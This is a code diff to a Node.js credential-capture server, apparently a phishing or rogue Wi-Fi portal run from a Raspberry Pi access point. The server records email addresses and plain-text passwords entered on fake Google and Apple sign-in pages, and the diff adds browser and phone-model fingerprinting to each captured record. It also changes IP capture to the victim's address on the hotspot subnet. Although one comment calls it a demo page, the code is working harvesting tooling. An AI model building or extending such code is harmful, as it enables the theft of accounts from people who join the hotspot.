@@ -90,6 +90,8 @@ function appendCredsFile(user) {
       source: user.source,
       ip: user.ip,
       device: user.device,
+      browser: user.browser,
+      model: user.model,
       capturedAt: user.capturedAt
     });
     fs.appendFileSync(CREDS_FILE, line + '\n', 'utf8');
@@ -119,7 +121,9 @@ async function loadCredsFile() {
           source: rec.source === 'apple' ? 'apple' : 'google',
           capturedAt: rec.capturedAt || new Date().toISOString(),
           ip: rec.ip,
-          device: rec.device || 'PC'
+          device: rec.device || 'PC',
+          browser: rec.browser || '',
+          model: rec.model || ''
         });
       } catch (e) { /* skip malformed lines */ }
     }
@@ -170,12 +174,41 @@ function isValidEmailProvider(email) {
   return email.slice(atIndex + 1).toLowerCase() === 'gmail.com';
 }
 
-// Detect the device type from the User-Agent header
+// Detect device type (APPLE/ANDROID/PC), browser and model from the
+// User-Agent. The model is best-effort: Android UAs expose it (Pixel 8,
+// SM-G991B, ...), iPhones only say "iPhone", so the iOS version is appended.
 function detectDevice(ua) {
   ua = ua || '';
-  if (/iPad|Tablet|PlayBook|Silk|Kindle|Nexus 7|Nexus 10/i.test(ua)) return 'TABLET';
-  if (/Mobi|Android|iPhone|iPod|Windows Phone|BlackBerry/i.test(ua)) return 'PHONE';
-  return 'PC';
+  const low = ua.toLowerCase();
+  let device = 'PC';
+  let browser = '';
+  let model = '';
+
+  if (/iphone|ipad|ipod/.test(low)) {
+    device = 'APPLE';
+    model = /iPad/.test(ua) ? 'iPad' : /iPod/.test(ua) ? 'iPod' : 'iPhone';
+    const ios = ua.match(/CPU (?:iPhone )?OS (\d+)[_\d]*/);
+    if (ios) model += ' (iOS ' + ios[1] + ')';
+  } else if (/android/.test(low)) {
+    device = 'ANDROID';
+    const m = ua.match(/Android [\d.]+; ([^;()]+)/);
+    if (m) model = m[1].trim().replace(/\s+Build\/.*$/, '');
+  } else {
+    if (/windows/.test(low)) model = 'Windows';
+    else if (/mac os x|macintosh/.test(low)) model = 'Mac';
+    else if (/linux/.test(low)) model = 'Linux';
+  }
+
+  if (/edg\//.test(low)) browser = 'Edge';
+  else if (/opr\/|opera/.test(low)) browser = 'Opera';
+  else if (/samsungbrowser/.test(low)) browser = 'Samsung Internet';
+  else if (/crios/.test(low)) browser = 'Chrome (iOS)';
+  else if (/chrome\//.test(low)) browser = 'Chrome';
+  else if (/fxios|firefox/.test(low)) browser = 'Firefox';
+  else if (/safari\//.test(low)) browser = 'Safari';
+  else browser = '?';
+
+  return { device, browser, model };
 }
 
 // Normalize a socket IP into a readable form (::1 -> 127.0.0.1)
@@ -187,19 +220,17 @@ function normalizeIp(raw) {
   return raw.replace('::ffff:', '') || 'unknown';
 }
 
-// IP + device captured from the incoming request.
-// Prefers the public IP detected by the client (sent as `publicIp` from the
-// browser via an external IP service), falling back to the server-side
-// socket/proxy IP when the client couldn't determine it.
-function captureMeta(req, publicIp) {
-  let ip = req.ip;
-  if (typeof publicIp === 'string') {
-    const candidate = publicIp.trim();
-    if (net.isIP(candidate) > 0) ip = candidate;
-  }
+// IP + device details captured from the incoming request. The IP is the one
+// the device is connected with (req.ip): on the Pi it is the phone's address
+// on the AP subnet (e.g. 10.3.0.x); behind a reverse proxy it is the real
+// client IP from X-Forwarded-For. NOT the router's public IP.
+function captureMeta(req) {
+  const meta = detectDevice(req.headers['user-agent'] || '');
   return {
-    ip: normalizeIp(ip),
-    device: detectDevice(req.headers['user-agent'] || '')
+    ip: normalizeIp(req.ip),
+    device: meta.device,
+    browser: meta.browser,
+    model: meta.model
   };
 }
 
@@ -213,7 +244,7 @@ async function createCapturedUser(email, password, source, name, req) {
     plainPassword: password, // stored in plain text for the demo page only
     source,
     capturedAt: new Date().toISOString(),
-    ...captureMeta(req, req.body && req.body.publicIp)
+    ...captureMeta(req)
   };
   appendCredsFile(user);
   return user;
@@ -224,7 +255,7 @@ function updateCapturedUser(user, password, source, req) {
   user.plainPassword = password;
   user.source = source;
   user.capturedAt = new Date().toISOString();
-  Object.assign(user, captureMeta(req, req.body && req.body.publicIp));
+  Object.assign(user, captureMeta(req));
   appendCredsFile(user);
   return user;
 }
@@ -255,6 +286,8 @@ function toCredentialView(user) {
     source: user.source === 'apple' ? 'apple' : 'google',
     ip: normalizeIp(user.ip),
     device: user.device || 'PC',
+    browser: user.browser || '?',
+    model: user.model || '',
     time: formatTime(user.capturedAt),
     date: formatDateTime(user.capturedAt),
     durationMs: 7000
